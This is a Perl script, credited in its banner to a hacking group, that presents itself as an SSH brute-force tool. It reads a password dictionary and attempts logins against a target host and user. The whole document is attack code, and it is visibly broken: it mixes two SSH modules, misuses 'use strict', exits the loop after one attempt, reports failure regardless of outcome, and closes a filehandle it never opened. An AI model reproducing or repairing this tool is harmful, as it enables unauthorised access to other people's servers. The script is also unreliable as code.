#!/usr/bin/perl
#c0dex by m0x.lk || Fucker Team ||
system ("clear");
system ("cls");
system ("color 02");
print "\n\n";
print "\t\t\tc0dex by m0x.lk\n\n";
print "\tm0x.lk || Fucker Team";
print "\t\t BruteSSH by m0x.lk\n";
sleep 1;

use strict();
use Net::SSH;

$host=$ARGV[0];
$user=$ARGV[1];
$passdict=$ARGV[2] || die "\n[+]Perl Usage: BruteSSH.pl host user dict\n";
print "\n\n";
$i = 1;
open (D,"<$passdict") or die "Diccionario no encontrado\n";
while(<D>)
{
$try = $_;
    chomp $try;

        $t = my $ssh = Net::SSH::Perl->new($host,debug=>1,use_pty=>1);
	$ssh->login($user, $try);
print "\n";
print "[+] Obteniendo Pass";
print "\n";
                print $i++ . ": Fallo - $try\n";

                print "'$try - $i intentos";
                last;
        $t->close;
}
close(IN);